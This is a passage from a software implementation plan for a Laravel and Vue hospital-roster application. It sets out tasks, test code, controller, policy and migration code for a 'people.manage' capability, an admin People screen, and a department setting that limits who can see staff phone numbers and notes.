`text-ok`. **No `dark:` utility, no raw Tailwind palette class, no hex in markup.** Never
`bg-panel-soft` — it compiles to nothing (finding 18). Mobile cards + desktop table, matching
`Levels.vue` and `Units.vue`.

**Dates.** Any date a screen shows is formatted server-side through `Calendar::label()` or
`Calendar::ymd()` and arrives as an Inertia prop. `resources/js` performs no date arithmetic —
`CalendarIsTheOnlyConverterTest` fails the build otherwise, and its JS needle list already covers
`new Date(`, `toISOString(`, `toLocaleDateString(`, `Date.parse(`, `Intl.DateTimeFormat` and six
more.

**Audit.** Every write calls `AuditLog::record($action, $detail, $userId, $ip)` with `$detail`
naming **ids, field names and counts only**. Staff personal data is covered by the same rule as
PHI (`docs/COMPLIANCE.md:120-123`): never a name, never an email, never a phone number, never a
level *code* (administrator-authored free text), never the contents of `notes`.

**Routes.** Every route in this plan sits behind `['auth', 'throttle:clinical',
'cap:people.manage']`. Writes are POST/PATCH/DELETE + CSRF.

**Queries.** Any narrowed query that will later resolve `$user->full_name`, `$user->position` or
`$user->member_email` **carries `person_id`** — a `select()`, `pluck()`, `value()` or
`with('rel:id,col')` that omits it makes the accessor return null silently, with no error. This
broke four live sites in P0c with zero test coverage. Any query joining `people` and `levels`
writes its `active` predicate table-qualified (finding 7).

---

# P1c-1 — tasks

---

### Task 1: `people.manage`, and the roster it opens

**Files:**
- Modify: `database/seeders/AccessControlSeeder.php`
- Modify: `docs/spec/08-foundation.md`
- Modify: `routes/web.php`
- Create: `app/Http/Controllers/Admin/PersonController.php`
- Create: `resources/js/Pages/Admin/People.vue`
- Modify: `resources/js/Layouts/AppLayout.vue`
- Test: create `tests/Feature/Admin/PeopleAccessTest.php`
- Test: modify `tests/Feature/AccessControlParityTest.php`
- Test: modify `tests/js/AppLayout.test.js`

**These land together and cannot be split.** A capability seeded with no route is dead weight; a
route with no nav entry is unreachable; a nav entry whose capability is missing from `canAdmin`
renders nothing at all. P0a's amendment 1 records what splitting a mutually-dependent pair costs,
and P1b's Task 2 shipped this exact shape for `structure.manage`.

This task ships the People screen **read-only and name-only** — no contact fields (Task 2), no
level column (Task 3), no writes (Task 4). That ordering is deliberate: the projection that
decides what a person's props contain is a security control, and it gets its own task and its own
tests rather than arriving inside a screen.

- [ ] **Step 1: Write the failing test**

Create `tests/Feature/Admin/PeopleAccessTest.php`:

```php
<?php

namespace Tests\Feature\Admin;

use App\Models\Capability;
use App\Models\Person;
use App\Models\RoleCapability;
use App\Models\User;
use Database\Seeders\AccessControlSeeder;
use Database\Seeders\ReferenceSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Inertia\Testing\AssertableInertia as Assert;
use Tests\TestCase;

/**
 * P1c's new capability, `people.manage` — the ROSTER (who exists, what level they hold, how to
 * reach them), as opposed to `users.manage`'s ACCOUNT console and `structure.manage`'s
 * departmental shape. Administrator-only by default, grantable per role or per named user.
 *
 * The screen is PERSON-scoped where Admin → Users is ACCOUNT-scoped, and the two must not be
 * conflated: a roster-only person is invisible to Admin → Users by construction (its list is
 * `User::query()->join('people', ...)`), and that person is frequently the on-call consultant
 * whose name is frozen onto signed evidence.
 */
class PeopleAccessTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(AccessControlSeeder::class);
        $this->seed(ReferenceSeeder::class);
    }

    public function test_the_capability_is_in_the_catalog(): void
    {
        $this->assertDatabaseHas('capabilities', ['key' => 'people.manage']);
    }

    public function test_it_defaults_to_administrator_only(): void
    {
        $id = (int) Capability::where('key', 'people.manage')->value('id');

        $this->assertSame(
            [0],
            RoleCapability::where('capability_id', $id)->pluck('position')->map(intval(...))->all()
        );
    }

    public function test_an_administrator_can_open_the_people_screen(): void
    {
        $admin = User::factory()->create(['position' => 0, 'full_name' => 'Aisha Admin']);
        Person::factory()->create(['full_name' => 'Bilal Roster', 'position' => 3]);

        $this->actingAs($admin)->get('/admin/people')
            ->assertOk()
            ->assertInertia(fn (Assert $page) => $page
                ->component('Admin/People')
                // Two people: the administrator's own person, and the roster-only consultant.
                ->has('people', 2)
                ->has('positions')
            );
    }

    /**
     * The whole reason this screen is person-scoped rather than account-scoped. Admin → Users
     * cannot show this row at all.
     */
    public function test_a_roster_only_person_is_listed(): void
    {
        $admin = User::factory()->create(['position' => 0]);
        $person = Person::factory()->create(['full_name' => 'Never Logged In', 'position' => 3]);

        $this->actingAs($admin)->get('/admin/people')
            ->assertOk()
            ->assertInertia(fn (Assert $page) => $page
                ->where('people.1.full_name', 'Never Logged In')
                ->where('people.1.has_account', false)
            );

        $this->assertFalse($person->hasAccount());
    }

    /**
     * PE-01's "status" is DERIVED, never stored. Design §5.1 deviation 3: there is no
     * `person_status` column and reintroducing one recreates the twelve-defence-sites problem
     * the two-table split exists to avoid.
     */
    public function test_status_is_derived_from_active_and_the_account_join(): void
    {
        $admin = User::factory()->create(['position' => 0]);
        Person::factory()->inactive()->create(['full_name' => 'Departed Rotator']);

        $this->actingAs($admin)->get('/admin/people')
            ->assertOk()
            ->assertInertia(fn (Assert $page) => $page
                ->where('people.1.active', false)
                ->where('people.1.has_account', false)
            );

        $this->assertFalse(\Illuminate\Support\Facades\Schema::hasColumn('people', 'status'));
        $this->assertFalse(\Illuminate\Support\Facades\Schema::hasColumn('people', 'person_status'));
    }

    /** UN-04's reasoning applied to people: an administrator who cannot SEE a retired person cannot bring them back. */
    public function test_inactive_and_soft_deleted_people_are_listed(): void
    {
        $admin = User::factory()->create(['position' => 0]);
        $gone = Person::factory()->create(['full_name' => 'Soft Deleted']);
        $gone->delete();

        $this->actingAs($admin)->get('/admin/people')
            ->assertOk()
            ->assertInertia(fn (Assert $page) => $page->has('people', 2));
    }

    public function test_a_resident_is_refused(): void
    {
        $resident = User::factory()->create(['position' => 4]);

        $this->actingAs($resident)->get('/admin/people')->assertForbidden();
    }

    /** `structure.manage` edits the department's SHAPE. A person is not a shape. */
    public function test_structure_manage_alone_does_not_open_the_roster(): void
    {
        $user = User::factory()->create(['position' => 4]);
        $this->grant($user, 'structure.manage');

        $this->actingAs($user)->get('/admin/people')->assertForbidden();
    }

    /** `users.manage` runs the ACCOUNT console; it is not a licence to read the roster's contacts. */
    public function test_users_manage_alone_does_not_open_the_roster(): void
    {
        $user = User::factory()->create(['position' => 4]);
        $this->grant($user, 'users.manage');

        $this->actingAs($user)->get('/admin/people')->assertForbidden();
    }

    public function test_a_refusal_is_audited(): void
    {
        $resident = User::factory()->create(['position' => 4]);

        $this->actingAs($resident)->get('/admin/people')->assertForbidden();

        $this->assertDatabaseHas('audit_log', ['action' => 'access_denied', 'detail' => 'cap=people.manage']);
    }

    public function test_a_guest_is_redirected_to_login(): void
    {
        $this->get('/admin/people')->assertRedirect('/login');
    }

    private function grant(User $user, string $key): void
    {
        \App\Models\UserCapability::create([
            'user_id' => $user->getKey(),
            'capability_id' => (int) Capability::where('key', $key)->value('id'),
            'effect' => 'grant',
        ]);

        \App\Support\AccessControl::flush((int) $user->getKey());
    }
}
```

- [ ] **Step 2: Run it and watch it go red**

```bash
export PATH="/c/Users/ahmed/AppData/Local/php84:/c/Users/ahmed/AppData/Local/composer-bin:$PATH"
php artisan test --filter PeopleAccessTest 2>&1 | tail -15
```

Expected: FAIL — `Failed asserting that a row in the table [capabilities] matches the attributes
{"key":"people.manage"}`.

- [ ] **Step 3: Seed the capability, and update the two documents that enumerate it**

In `database/seeders/AccessControlSeeder.php`, add to `DESCRIPTIONS`:

```php
        'people.manage' => 'Manage the departmental ROSTER: who is on it, their training level '
            .'and its history, their contact details and scheduling constraints, whether they are '
            .'an external rotator, and the annual promotion. Distinct from “users.manage”, which '
            .'runs the ACCOUNT console (approvals, activation, roles, invitations) — a person on '
            .'the roster may never have had an account at all, and is invisible to that screen by '
            .'construction. Holding this does NOT create accounts: the invitation flow remains '
            .'the only way one is made. It DOES govern who can read staff phone numbers and '
            .'notes, subject to the department\'s contact-visibility setting. Default: '
            .'Administrator only; grantable per role or per named user like any capability.',
```

to `CATALOG`, immediately after the `// User & access administration.` block and before the
`// Departmental structure` block:

```php
        // The departmental roster (Munawib PE-*, LV-02…04, ST-04).
        'people.manage' => 'Manage the roster: people, levels, promotion and roster import',
```

and to `ROLE_DEFAULTS[0]`, on the same line as `structure.manage`:

```php
        0 => [
            'profile.manage',
            'endorsement.view', 'endorsement.edit', 'endorsement.reopen', 'endorsement.compliance',
            'users.manage', 'users.manage_residents', 'access.manage', 'settings.manage',
            'structure.manage', 'people.manage',
        ],
```

In `docs/spec/08-foundation.md` **line 36**, append `` `people.manage` `` to the catalog list. In
**line 38**, append after the `structure.manage` sentence:

> `people.manage` (the roster: people, levels, promotion, roster import — Munawib PE-\*,
> LV-02…04, ST-04) also defaults **Administrator-only**, added P1c 2026-08-09.

In `tests/Feature/AccessControlParityTest.php`, add `'people.manage'` to the `$adminOnly` array
(`:37-40`) and extend the comment above it. Finding 17: this test will go red the moment the
seeder changes, and that red is the expected one.

- [ ] **Step 4: The controller**

Create `app/Http/Controllers/Admin/PersonController.php`:

```php
<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Person;
use App\Models\Position;
use Inertia\Inertia;
use Inertia\Response;

/**
 * Admin → People (cap:people.manage). Munawib PE-01…03, LV-02…04, ST-04.
 *
 * PERSON-scoped, where Admin → Users is ACCOUNT-scoped. The difference is the point: a
 * roster-only person has no `users` row, so Admin → Users (whose list is
 * `User::query()->join('people', ...)`) cannot show them at all — and that person is frequently
 * the on-call consultant whose name is frozen onto a signed handover (D9).
 *
 * NOTHING HERE CREATES AN ACCOUNT. The invitation flow is the only path from a roster entry to a
 * credential (design §5.1), and `tests/Feature/Build/RosterNeverMintsCredentialsTest.php`
 * asserts at source level that this class never writes to `users`.
 *
 * `withTrashed()` is deliberate: people are deactivated and never deleted (owner ruling), and an
 * administrator who cannot SEE a retired person cannot bring them back. It is also why the four
 * named roles on `handover_signoffs` stay resolvable.
 */
class PersonController extends Controller
{
    public function index(): Response
    {
        $people = Person::withTrashed()
            ->withExists(['user as has_account'])
            ->orderBy('people.full_name')
            ->get();

        return Inertia::render('Admin/People', [
            // Task 2 replaces this map with App\Support\PersonPresenter, which is where the
            // contact-visibility policy is enforced. Until then this screen carries NO contact
            // field at all — `phone` and `notes` are absent, not null.
            'people' => $people->map(fn (Person $p): array => [
                'id' => (int) $p->getKey(),
                'full_name' => (string) $p->full_name,
                'short_name' => $p->short_name,
                'position' => (int) $p->position,
                'external' => (bool) $p->external,
                'active' => (bool) $p->active,
                'has_account' => (bool) $p->has_account,
                'retired' => $p->trashed(),
            ])->values()->all(),
            'positions' => Position::orderBy('id')->get(['id', 'name']),
        ]);
    }
}
```

Note `withExists(['user as has_account'])` rather than `$p->hasAccount()` per row: the latter is
one `EXISTS` query per person and this list is the N+1 the master rota will inherit.

- [ ] **Step 5: The route**

In `routes/web.php`, after the `admin/structure` group closes, add a new group. It is **not**
under `admin/structure` — a person is not part of the department's shape, and `structure.manage`
must not become a licence to read the roster:

```php
/*
 * Admin → People: the departmental ROSTER (Munawib PE-01…03, LV-02…04, ST-04). Its own
 * capability, `people.manage`, deliberately separate from `users.manage` (the ACCOUNT console)
 * and from `structure.manage` (the department's shape) — see the P1c plan's Decision A.
 *
 * Nothing in this group creates an account. The invitation flow under `admin/invitations`
 * remains the only path from a roster entry to a credential.
 */
Route::middleware(['auth', 'throttle:clinical', 'cap:people.manage'])
    ->prefix('admin')
    ->name('admin.')
    ->group(function () {
        Route::get('/people', [PersonController::class, 'index'])->name('people');
    });
```

Add `use App\Http\Controllers\Admin\PersonController;` to the imports at the top of the file,
beside the existing `UnitController`/`LevelController` imports.

- [ ] **Step 6: The screen**

Create `resources/js/Pages/Admin/People.vue` — `AppLayout`, a client-side search box over
`full_name`/`short_name` (the `Users.vue:70-76` shape, but never touching a contact field), a
mobile card list and a desktop table with columns **Name · Short name · Role · Status**. "Status"
renders the derived pair, never a stored value:

```
Active / Retired          from `active` (and `retired` for a soft-deleted row)
Account / Roster only     from `has_account`
External                  a `.channel-tag` when `external` is true (fully wired in Task 5)
```

No contact column exists yet. No level column exists yet. Both arrive with the tasks that build
their controls, so a reviewer can see exactly which commit introduced each.

- [ ] **Step 7: The nav**

In `resources/js/Layouts/AppLayout.vue`, extend `canAdmin` (`:70-71`):

```js
const canAdmin = computed(() => can('access.manage') || can('users.manage')
    || can('users.manage_residents') || can('settings.manage') || can('structure.manage')
    || can('people.manage'));
```

and add the link inside the `v-if="canAdmin"` block, immediately after the Users link so the two
person-shaped screens sit together:

```html
                    <Link v-if="can('people.manage')" href="/admin/people"
                          class="block rounded-md px-3 py-2 text-sm text-body hover:bg-ground-deep">
                        People
                    </Link>
```

In `tests/js/AppLayout.test.js`, add a case mirroring the existing `structure.manage`-alone case
(`:103-117`): `people.manage` alone shows Administration and People, and shows neither Access
Control, Settings, Units nor Users.

- [ ] **Step 8: Verify and commit**

```bash
export PATH="/c/Users/ahmed/AppData/Local/php84:/c/Users/ahmed/AppData/Local/composer-bin:$PATH"
php artisan test --filter PeopleAccessTest 2>&1 | tail -5
npm test 2>&1 | tail -5
npm run build 2>&1 | tail -3
php artisan test 2>&1 | tail -3
```

Expected: `PeopleAccessTest` 10 passed; `npm test` **112** (111 + 1); full suite **896 passed**
(886 + 10), 0 failures. `AccessControlParityTest` and `AccessControlSeederRespectsRevocationsTest`
must be green — if either is red, the catalog and the seeder have drifted (P1b finding 7).

```bash
git add database/seeders/AccessControlSeeder.php docs/spec/08-foundation.md routes/web.php \
        app/Http/Controllers/Admin/PersonController.php resources/js/ tests/
git commit -m "feat: the roster stops being a table nobody can see"
```

---

### Task 2: PE-02 — one projection, one policy, one department setting

**Files:**
- Create: `database/migrations/2026_08_14_120001_add_contact_visibility_to_institutions.php`
- Modify: `app/Models/Institution.php`
- Create: `app/Policies/PersonPolicy.php` *(creates `app/Policies/`)*
- Create: `app/Support/PersonPresenter.php`
- Create: `app/Support/ContactVisibility.php`
- Modify: `app/Http/Controllers/Admin/PersonController.php`
- Modify: `resources/js/Pages/Admin/People.vue`
- Modify: `docs/COMPLIANCE.md`
- Test: create `tests/Feature/Admin/ContactVisibilityTest.php`
- Test: create `tests/Feature/Build/ContactFieldsAreProjectedOnceTest.php`
- Test: modify `tests/Feature/Build/CalendarWritersFlushTest.php`

Finding 2 is why this is its own task and not three lines inside Task 1. `Person::$hidden` does
not protect an explicitly-built props array, every admin screen in this codebase builds one, and
`grep` confirms **zero** current readers of `->phone`/`->notes`. That clean slate is worth one
task and one source-level guard.

- [ ] **Step 1: Write the failing tests**

Create `tests/Feature/Admin/ContactVisibilityTest.php` covering:

- `test_the_default_is_admins_only` — a freshly migrated institution has
  `contact_visibility === Institution::CONTACT_ADMINS`;
- `test_a_people_manager_sees_phone_and_notes` — the props for one person contain both keys;
- `test_a_non_manager_cannot_open_the_screen_at_all` — 403 (Task 1's gate, restated so the
  contact tests cannot be read as the only protection);
- `test_phone_is_ABSENT_not_null_when_the_policy_refuses` — with visibility `admins` and a
  viewer holding `people.manage` **denied** per-user, `$page->missing('people.0.phone')`. Absent,
  not null: a null phone and a withheld phone must not look the same on the wire, or a future
  consumer renders one as the other;
- `test_setting_members_exposes_phone_to_any_account_holder_but_never_notes` — flips the setting,
  asserts `phone` present and `notes` **still** missing for a non-manager;
- `test_notes_is_never_exposed_by_the_setting` — the setting has no value that reveals `notes`;
- `test_the_setting_is_validated_against_an_allow_list` — a PATCH with `contact_visibility=all`
  is a 422 naming the field;
- `test_the_setting_write_is_audited_by_key_never_by_value` — an `audit_log` row with action
  `contact_visibility_update` whose `detail` contains `contact_visibility` and does **not**
  contain the chosen value... *(state it as: detail is exactly `key=contact_visibility`)*;
- `test_a_policy_ability_is_never_named_like_a_capability_key` — the finding-1 guard:

```php
    /**
     * `Gate::before` (AppServiceProvider.php:56) returns TRUE for any ability string that is a
     * capability key the user holds, and only returns null on a miss — which is what lets
     * ordinary policies run at all. A policy ability named like a capability key would therefore
     * be short-circuited to `true` for every holder and the policy would never execute: a silent
     * authorization bypass with no error and no failing test anywhere else.
     */
    public function test_policy_abilities_do_not_collide_with_capability_keys(): void
    {
        $abilities = array_map(
            fn (\ReflectionMethod $m): string => $m->getName(),
            (new \ReflectionClass(\App\Policies\PersonPolicy::class))->getMethods(\ReflectionMethod::IS_PUBLIC),
        );

        $keys = \App\Models\Capability::pluck('key')->all();

        foreach ($abilities as $ability) {
            $this->assertNotContains($ability, $keys, "Policy ability '{$ability}' collides with a capability key.");
            $this->assertStringNotContainsString('.', $ability, "Policy ability '{$ability}' looks like a capability key.");
        }
    }
```

Create `tests/Feature/Build/ContactFieldsAreProjectedOnceTest.php` — the source-level guard,
modelled on `CalendarIsTheOnlyConverterTest`:

```php
<?php

namespace Tests\Feature\Build;

use Illuminate\Support\Facades\File;
use Tests\TestCase;

/**
 * PE-02, enforced rather than intended.
 *
 * `Person::$hidden = ['phone', 'notes']` bites on toArray()/toJson() ONLY. Every admin screen in
 * this codebase builds its Inertia props with an explicit present() map (UnitController,
 * LevelController, UserManagementController), which reads attributes directly and never consults
 * $hidden. A People screen written in the house style with `'phone' => $person->phone` would
 * publish a clinician's mobile number to every viewer with $hidden fully in place.
 *
 * So `App\Support\PersonPresenter` is the ONE place a Person becomes props, it takes the viewing
 * user, and this test is what stops a second one appearing. Same species as
 * CalendarIsTheOnlyConverterTest and InstitutionProvenanceTest — conventions decay, tests do not.
 *
 * Scanned: app/ + database/ + routes/. NOT database/factories/ — a factory populating a fixture
 * phone number is not a disclosure surface.
 */
class ContactFieldsAreProjectedOnceTest extends TestCase
{
    /** Every file allowed to touch a person's contact fields, with why. */
    private const ALLOW_LIST = [
        // The one projection. This is the control.
        'app/Support/PersonPresenter.php',
        // Declares the columns ($fillable) and hides them from accidental serialisation ($hidden).
        'app/Models/Person.php',
        // The roster importer WRITES phone from a spreadsheet column; it never renders one.
        'app/Support/Roster/RosterImport.php',
        // The write-side validation names the fields it accepts.
        'app/Http/Requests/Admin/PersonRequest.php',
    ];

    private const NEEDLES = ['->phone', '->notes', "'phone'", "'notes'"];

    public function test_only_the_presenter_reads_a_persons_contact_fields(): void
    {
        $offenders = [];

        foreach ([app_path(), base_path('database'), base_path('routes')] as $dir) {
            foreach (File::allFiles($dir) as $file) {
                if ($file->getExtension() !== 'php') {
                    continue;
                }

                $relative = str_replace('\\', '/', str_replace(base_path().DIRECTORY_SEPARATOR, '', $file->getPathname()));

                if (in_array($relative, self::ALLOW_LIST, true) || str_starts_with($relative, 'database/factories/')) {
                    continue;
                }

                $contents = (string) File::get($file->getPathname());

                foreach (self::NEEDLES as $needle) {
                    if (str_contains($contents, $needle)) {
                        $offenders[] = $relative.' contains '.$needle;
                    }
                }
            }
        }

        $this->assertSame([], $offenders,
            "Staff contact fields must be projected only by App\\Support\\PersonPresenter (PE-02).\n"
            .implode("\n", $offenders));
    }

    /** A stale allow-list is a silently disabled guard. */
    public function test_every_allow_listed_file_still_exists(): void
    {
        foreach (self::ALLOW_LIST as $relative) {
            $this->assertFileExists(base_path($relative), "Allow-listed file {$relative} is gone — prune the list.");
        }
    }
}
```

Note the allow-list names two files that do not exist until Tasks 4 and 12. Until then
`test_every_allow_listed_file_still_exists` is red, which is wrong — so **this task's allow-list
carries only the first two entries**, and Tasks 4 and 12 each add their own line as part of their
own commit. Stated here so the implementer does not copy the final shape into the first commit.

- [ ] **Step 2: Run and watch both go red**

```bash
export PATH="/c/Users/ahmed/AppData/Local/php84:/c/Users/ahmed/AppData/Local/composer-bin:$PATH"
php artisan test --filter "ContactVisibilityTest|ContactFieldsAreProjectedOnce" 2>&1 | tail -20
```

Expected: `ContactVisibilityTest` fails with `SQLSTATE[HY000]: General error: 1 no such column:
contact_visibility`; `ContactFieldsAreProjectedOnceTest` fails on the missing
`app/Support/PersonPresenter.php`.

- [ ] **Step 3: The migration**

Create `database/migrations/2026_08_14_120001_add_contact_visibility_to_institutions.php`:

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

/**
 * Munawib PE-02 — "contact visibility per policy toggles, logged-in members only".
 *
 * TWO VALUES, not a per-field matrix, and `notes` is on neither side of the toggle:
 *
 *   'admins'   (default) only holders of `people.manage` see a phone number
 *   'members'  any authenticated account holder sees a phone number
 *
 * `notes` stays `people.manage`-only under both. It is free text a supervisor writes ABOUT a
 * named colleague; docs/COMPLIANCE.md already records it as stored in the clear and legible in
 * every backup, with $hidden named as the compensating control. A department cannot opt its way
 * out of that, and a phone number for the on-call list is a different kind of fact.
 *
 * Default 'admins' because Munawib §3 is "privacy by default": a department that wants an open
 * directory says so in one click; a department that discovers its notes were readable cannot
 * un-read them.
 *
 * Additive and defaulted, on a table holding one real row per deployment (D11). This is NOT a
 * calendar column — `Calendar::settings()`'s memo carries only the six calendar values, so a
 * write here leaves nothing stale for `Calendar::flush()` to clear. See
 * `CalendarWritersFlushTest`'s allow-list entry for App\Support\ContactVisibility.
 */
return new class extends Migration
{
    public function up(): void
    {
        Schema::table('institutions', function (Blueprint $table) {
            if (! Schema::hasColumn('institutions', 'contact_visibility')) {
                $table->string('contact_visibility', 20)->default('admins')->after('active');
            }
        });
    }

    public function down(): void
    {
        Schema::table('institutions', function (Blueprint $table) {
            $table->dropColumn('contact_visibility');
        });
    }
};
```

In `app/Models/Institution.php`, add `'contact_visibility'` to `$fillable`, add it to
`protected $attributes` with the value `'admins'` (P1a Task 1's amendment: Eloquent never reads a
DB-applied default back into a freshly `create()`d in-memory model, so without this a new
institution reports `null` until re-fetched), and add the constants:

```php
    public const CONTACT_ADMINS = 'admins';
    public const CONTACT_MEMBERS = 'members';

    /** Offered and validated from ONE list — the SignoffPickers discipline, applied small. */
    public const CONTACT_VISIBILITIES = [
        self::CONTACT_ADMINS => 'Administrators and roster managers only',
        self::CONTACT_MEMBERS => 'Any signed-in member',
    ];
```

- [ ] **Step 4: The setting reader/writer**

Create `app/Support/ContactVisibility.php` — a tiny class whose only job is to be the one place
that reads and writes the column, so the `CalendarWritersFlushTest` allow-list has exactly one
entry to name:

```php
<?php

namespace App\Support;

use App\Models\Institution;

/**
 * PE-02's department setting. The one reader and the one writer of
 * `institutions.contact_visibility`.
 *
 * NOT a calendar column: `Calendar::settings()` memoises the six calendar values as an array,
 * not the Institution model, so a write here leaves nothing stale for `Calendar::flush()` to
 * clear. That is the stated reason this file is allow-listed in `CalendarWritersFlushTest` —
 * the guard's needle list includes `Institution::current()`, which any reader of any column on
 * that row necessarily calls.
 *
 * Falls back to the STRICTER value when no institution row exists: `RefreshDatabase` leaves
 * `institutions` empty until something seeds it, and a missing row must never mean "show
 * everyone everything".
 */
final class ContactVisibility
{
    public static function current(): string
    {
        $value = Institution::current()?->contact_visibility;

        return array_key_exists((string) $value, Institution::CONTACT_VISIBILITIES)
            ? (string) $value
            : Institution::CONTACT_ADMINS;
    }

    public static function membersMaySeePhone(): bool
    {
        return self::current() === Institution::CONTACT_MEMBERS;
    }

    public static function set(string $value): void
    {
        $institution = Institution::current();

        if ($institution === null) {
            return;
        }

        $institution->contact_visibility = $value;
        $institution->save();
    }
}
```

Add to `CalendarWritersFlushTest::ALLOW_LIST`:

```php
        // Reads and writes `institutions.contact_visibility` — a PE-02 policy column, not a
        // calendar one. Calendar::settings() memoises the six calendar values as an array, not
        // the model, so there is nothing stale here for flush() to clear. Matched only because
        // WRITE_NEEDLES includes `Institution::current()`, which any reader of that row calls.
        'app/Support/ContactVisibility.php',
```

- [ ] **Step 5: The policy**

Create `app/Policies/PersonPolicy.php` (this creates the directory):

```php
<?php

namespace App\Policies;

use App\Models\Person;
use App\Models\User;
use App\Support\AccessControl;
use App\Support\ContactVisibility;

/**
 * Munawib PE-02. The first policy in this codebase — `app/Policies/` did not exist before P1c.
 *
 * ABILITY NAMES ARE camelCase ON PURPOSE. `Gate::before` (AppServiceProvider.php:56) bridges the
 * capability resolver into the Gate and returns TRUE for any ability string that is a capability
 * key the user holds, returning null only on a miss. An ability named `people.manage` here would
 * therefore be short-circuited to true for every holder and this class would never run — a
 * silent authorization bypass. `ContactVisibilityTest` asserts the separation rather than trusting
 * it.
 *
 * No policy is registered in a provider: Laravel 13 discovers `App\Policies\{Model}Policy`
 * conventionally, and adding a registration array would create a second place for this to be
 * true.
 */
class PersonPolicy
{
    /**
     * A phone number. Roster managers always; any signed-in account holder only when the
     * department has opted in.
     */
    public function viewContact(User $user, Person $person): bool
    {
        return AccessControl::allows($user, 'people.manage') || ContactVisibility::membersMaySeePhone();
    }

    /**
     * Free text a supervisor wrote ABOUT this person. No department setting reveals it — see the
     * migration's own docblock and docs/COMPLIANCE.md.
     */
    public function viewNotes(User $user, Person $person): bool
    {
        return AccessControl::allows($user, 'people.manage');
    }
}
```

- [ ] **Step 6: The projection**

Create `app/Support/PersonPresenter.php`:

```php
<?php

namespace App\Support;

use App\Models\Person;
use App\Models\User;

/**
 * The ONE place a Person becomes Inertia props (PE-02).
 *
 * `Person::$hidden = ['phone', 'notes']` is NOT the control and never was: it applies to
 * toArray()/toJson(), and every admin screen in this codebase builds its props with an explicit
 * map that bypasses it. $hidden stays as defence in depth against an accidental whole-model
 * serialisation; THIS class is what decides what a viewer may see.
 * `tests/Feature/Build/ContactFieldsAreProjectedOnceTest.php` stops a second one appearing.
 *
 * A withheld field is ABSENT, never null. A null phone and a withheld phone are different facts,
 * and a consumer given the same shape for both will eventually render one as the other.
 *
 * Never carries `institution_id` (provenance, D11 — not a client concern) and never carries a
 * password, signature path or any `users` column: this projects a PERSON, not an account.
 */
final class PersonPresenter
{
    /**
     * @param  array<string, mixed>  $extra  task-specific keys (level, history) merged verbatim
     * @return array<string, mixed>
     */
    public static function one(Person $person, ?User $viewer, array $extra = []): array
    {
        $base = [
            'id' => (int) $person->getKey(),
            'full_name' => (string) $person->full_name,
            'short_name' => $person->short_name,
            'position' => (int) $person->position,
            'external' => (bool) $person->external,
            'active' => (bool) $person->active,
            'retired' => $person->trashed(),
            // `has_account` is set by the caller's withExists() alias; a per-row hasAccount()
            // call would be one EXISTS query per person.
            'has_account' => (bool) ($person->has_account ?? $person->hasAccount()),
            'email' => $person->email,
            'joined_at' => $person->joined_at === null ? null : Calendar::ymd($person->joined_at),
        ];

        if ($viewer !== null && $viewer->can('viewContact', $person)) {
            $base['phone'] = $person->phone;
        }

        if ($viewer !== null && $viewer->can('viewNotes', $person)) {
            $base['notes'] = $person->notes;
            $base['constraints'] = $person->constraints;
        }

        return $base + $extra;
    }

    /**
     * @param  iterable<Person>  $people
     * @return list<array<string, mixed>>
     */
    public static function many(iterable $people, ?User $viewer): array
    {
        $out = [];

        foreach ($people as $person) {
            $out[] = self::one($person, $viewer);
        }

        return $out;
    }
}
```

`email` is deliberately **not** policy-gated: it is the roster's matching key, it is already
visible on Admin → Users for every account holder (`UserManagementController::index()`'s
`member_email`), and PE-02's own wording puts *contacts* — phone — behind the toggle. Stated here
so a reviewer sees it as a decision rather than an omission.

- [ ] **Step 7: Wire the screen, and add the setting control**

`PersonController::index()` replaces its inline map with
`PersonPresenter::many($people, $request->user())`, gains
`'contact_visibility' => ContactVisibility::current()` and
`'contact_visibilities' => Institution::CONTACT_VISIBILITIES`, and takes `Request $request`.

Add `PersonController::updateVisibility(Request $request)`: validates
`['contact_visibility' => ['required', 'string', Rule::in(array_keys(Institution::CONTACT_VISIBILITIES))]]`
— offered and validated from one list — calls `ContactVisibility::set()`, and audits
`contact_visibility_update` with detail exactly `key=contact_visibility`. Route:
`Route::patch('/people/visibility', ...)->name('people.visibility');`, declared **before** any
`/people/{person}` route so `visibility` never binds as a person id (the discipline
`routes/web.php:154-156` already applies to `units/merge`).

`People.vue` gains a small "Contact visibility" `<select>` above the table, and a Phone column
rendered only when the key is present:

```html
<td v-if="'phone' in p" class="readout px-4 py-2 text-body">{{ p.phone || '—' }}</td>
```

`'phone' in p`, not `p.phone`, because absent and empty are different and the header must not
appear for a viewer who cannot see the column.

- [ ] **Step 8: Correct `docs/COMPLIANCE.md`**

The "Staff roster data" section (`:103-131`) says `notes` and `phone` are `$hidden` "so neither
reaches an Inertia prop". After this task that sentence is *incomplete*, not wrong, and an
incomplete control statement in a compliance document is the kind that gets relied on. Replace it
with the accurate one: `$hidden` prevents accidental whole-model serialisation; the enforced
control is `App\Support\PersonPresenter` plus `App\Policies\PersonPolicy`, backed by a
source-level guard; the department setting governs `phone` only and never `notes`.

- [ ] **Step 9: Verify and commit**

```bash
export PATH="/c/Users/ahmed/AppData/Local/php84:/c/Users/ahmed/AppData/Local/composer-bin:$PATH"
php artisan test --filter "ContactVisibilityTest|ContactFieldsAreProjectedOnce|CalendarWritersFlush" 2>&1 | tail -8
npm run build 2>&1 | tail -3
php artisan test 2>&1 | tail -3
```

Expected: full suite **907 passed** (896 + 11 — nine `ContactVisibilityTest` cases and two
`ContactFieldsAreProjectedOnceTest`). `CalendarWritersFlushTest` green with its new allow-list
entry.

```bash
git add database/migrations app/Models/Institution.php app/Policies app/Support routes/web.php \
        app/Http/Controllers/Admin/PersonController.php resources/js docs/COMPLIANCE.md tests/
git commit -m "feat: a phone number is something the department decides to show"
```

---

### Task 3: `Person::levelsAt()` — one predicate, resolved set-wise

**Files:**
- Modify: `app/Models/Person.php`
- Modify: `app/Support/PersonPresenter.php`
- Modify: `app/Http/Controllers/Admin/PersonController.php`
- Modify: `resources/js/Pages/Admin/People.vue`
- Test: create `tests/Feature/Identity/LevelResolverTest.php`

Finding 5: `levelAt()` is one query per person. Finding 7: `Level::scopeActive()` is not
table-qualified, so a joined query calling it fails with an ambiguous-column error. Both are
resolved once, here, before three separate consumers (this screen, the promotion preview, the
rota grid) each invent their own.

